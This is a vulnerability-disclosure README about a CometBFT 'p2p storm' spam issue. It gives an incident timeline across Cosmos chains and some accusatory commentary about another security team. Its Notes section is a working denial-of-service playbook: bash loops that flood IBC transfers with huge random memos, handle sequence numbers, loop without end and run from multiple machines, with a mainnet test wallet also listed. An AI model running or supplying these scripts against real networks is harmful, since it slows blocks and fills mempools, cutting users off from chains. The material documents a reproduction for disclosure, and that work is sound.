# Spammy

## Timeline

* 2021, Sept 
  * Issue first noticed on sentinel
    * [validator chat logs](./sentinel-evidence/sentinelvalidatortg/) 10/15/2021-12/15/2021
    * first report to icf hackerone
    * https://acrobat.adobe.com/link/review?uri=urn:aaid:scds:US:c14b2605-3497-381a-870e-510b92e33f75
* 2022, May 
  * Issue occurs on Luna Classic, accelerating the loss of billions in user funds
  * Today, notably, Luna2 has a block size of 1MB and Terraform Labs confirmed that it is due to this
* 2023, August 15 
  * Issue occurs on Stride and Notional begins to investigate with suport from a broad group of teams.
* 2023, Sept 21
  * 8:01am - Jacob Gadikian adds Jessy Irwin to "invalid block parts" channel
    * https://notionalgroup.slack.com/archives/C05N6G0CLBB/p1695272490812409
  * 8:54am - Jessy Irwin leaves "invalid block parts" channel without saying a word
    * https://notionalgroup.slack.com/archives/C05N6G0CLBB/p1695275679442249
  * 9:08am - Amulet subtweets this
    * https://x.com/amuletdotdev/status/1704739436335083941?s=20 
* 2023, Sept 25 
  * Notional Labs reproduces the issue on the cosmos hub replicated security testnet with the explicit approval of Hypha
* 2023, Sept 26
  * Notional labs has accelerated the attack with a [bash script](./attack.bash)
  * RS testnet blocks last 38 seconds each
  * Notional labs discontinues the attack on the RS testnet
* 2023, Sept 27
  * The network continues to experience degraded performance
  * Validator mempools remain [full](./mempoolcryptocrew.json) 
  * Block times are stil [7.9 seconds on average](./screenshots/hub-testnet/current-09-27_19-55-05.jpg), representing a service degredation of 33%
  * Full validator mempools could reduce access to the network for users
  * Network hasn't been attacked for over 18 hours
* 2023, Sept 28 7:16PM CET - amulet announces a low severity security issue with comet, likely because they've not got full context on the issue
  * https://x.com/amuletdotdev/status/1707429071213511090
  * https://github.com/cometbft/cometbft/security/advisories/GHSA-hq58-p9mv-338c 
* 2023, Sept 29 2:14PM CET
  * Cosmos hub replicated security testnet continues to have degraded performance due to gossiping of invalid block parts, logs below.
* 2023, Sept 30:
  * Video One: (DM Jacob for access)
  * Video Two: (DM Jacob for access)
  * [Secret Network Governance Proposal by Assaf](https://www.mintscan.io/secret/proposals/274)
  * Formation of Validator Working Group on Spam per Amulet Recommendations by Jacob Gadikian
* 2023, Oct 1:
  * [Osmosis Expedited Governance Proposal by Jacob Gadikian](https://www.mintscan.io/osmosis/proposals/645)
  * [Cosmos Hub Governance Proposal by Jacob Gadikian](https://www.mintscan.io/cosmos/proposals/827)
  
 

It is my strong belief that Amulet does not understand the nature of the situation because they've failed to communicate with the numerous teams involved.  If they were to even just sync the cosmos hub replicated security testnet, they would immediately see that it is still suffering from the previous attack. 

Amulet seems to have not understood that there are numerous issues at play, despite being in possession of this report:

https://docs.google.com/document/d/1oCjsVYMaV77etxOEbDxh58vkAQaXf7RAkhXvF_8GYis/edit




## Tooling and documentation for the reproduction of:

* banana king
* client update spam
* banana client

In an effort to reporoduce a p2p storm on the cosmos hub testnet. 


### it has been [reproduced](./REPRODUCITON.md)






## Links to explorer

* **client updates**
 * https://ping.pub/cosmos/tx/2BA652123FFD549CCFA672BDD596801DABAD680029EA817369814DE5750DB4AB

* **testing wallet - mainnet**
  * https://www.mintscan.io/cosmos/address/cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq
  * txns were made so that they fail intentionally.

* **testing wallet - testnet**
  * will vary between failed transactions and successes
  * goal is to increase block time on the testnet
  * https://explorer.rs-testnet.polypore.xyz/ 
  


## Target

We're looking to transmit a "banana client".  This transaction will 


## P2P storms have occured on the following networks:

* Sentinel
* Luna Classic
  * Led to economic harm 
* Stride


And p2p storms have been safely replicated on the cosmos hub replicated security testnet. 


## Notes

Change the maximum request body size in config.toml

```toml
# Maximum size of request body, in bytes
max_body_bytes = 100000000
```

Generate a random string (hex output)

```bash
openssl rand -hex 10000000
```

Sign a transcation


Broadcast a transaction (oddly cli won't broadcast, we'll need to chain it)
```bash
gaiad tx broadcast bananasigned1.json --home ~/.gaia-rs
```

Abuse the ibc memo field
```bash
gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 10000) --chain-id provider --gas auto --yes
 ```

 Abuse the ibc memo field fast
 ```bash
 for (( ; ; )); do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 10000) --chain-id provider --gas auto --yes ; done
 ```

 Abuse the ibc memo field fast and avoid problems with the sequence number
 ```bash
 for i in {2000..3000}; do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i ; done
 ```

 Abuse the ibc memo field fast and avoid problems with the sequence number, wait a tenth of a second between runs
 ```bash
for i in {3045..5000}; do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i ; sleep .1 ; done
```

Abuse ibc memos using the account sequence to start


  Loop the loop script
```bash
while true ; do bash attack2.bash ; done
```

```bash
set -e

SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq | jq --raw-output ' .account.sequence ')

for i in $( eval echo {"$SEQUENCE"..10000000} )
         do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i
         done
```
but do it from two machines

```bash
set -e

SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq | jq --raw-output ' .account.sequence ')

for i in $( eval echo {"$SEQUENCE"..10000000} )
         do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i
         done
```

